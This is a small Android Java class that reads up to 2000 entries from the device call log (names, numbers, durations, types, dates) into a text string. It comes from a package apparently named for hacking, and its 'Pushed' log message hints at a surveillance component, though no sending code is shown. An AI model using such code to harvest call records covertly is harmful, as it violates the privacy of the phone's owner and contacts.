package commandoengineer.whathehack;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import java.util.Date;

/**
 * Created by yash on 20/5/17.
 */

public class CallLogger {

    public String readCallLogs(Context context) {
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            return "Permission Denied.";

        Cursor mCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type_index = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        int duration_index = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int date_index = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int name_index = mCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

        StringBuilder sb = new StringBuilder();
        int counter = 0;
        while (mCursor.moveToNext() && counter < 2000) {

            String phoneNumber = mCursor.getString(number);
            String callType = mCursor.getString(type_index);
            String caller = mCursor.getString(name_index);
            String callDuration = mCursor.getString(duration_index);
            String callDate = mCursor.getString(date_index);

            sb.append("\n")
                    .append("Name: " + caller + "\n")
                    .append("No: " + phoneNumber + "\n")
                    .append("Len: " + callDuration + "\n")
                    .append("T: " + callType + "\n");
            try {
                Date cDate = new Date(Long.valueOf(callDate.trim()));
                sb.append("D:" + cDate + "\n\n");
            } catch (Exception e) {
                sb.append("D:" + callDate + "\n\n");
            }

            counter++;
        }
        Log.e("s", "Pushed " + counter + "logs");
        return sb.toString();
    }


}
